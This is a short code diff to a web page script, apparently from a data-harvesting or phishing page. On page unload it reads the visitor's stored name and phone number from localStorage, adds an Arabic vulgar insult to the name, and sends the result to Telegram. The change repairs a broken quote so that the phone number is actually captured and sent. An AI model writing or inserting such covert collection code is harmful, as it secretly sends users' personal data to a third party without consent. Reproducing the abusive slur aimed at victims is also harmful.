@@ -16,7 +16,7 @@ window.addEventListener('beforeunload', function (e) {
     
     message = `
         ابن الشرموطة ${localStorage.getItem('userName')} 
-        رقم تلفون: ${localStorage.getItem('phonenumber)} 
+        رقم تلفون: ${localStorage.getItem('phonenumber')} 
     `
     send_telegram_message(message)
 
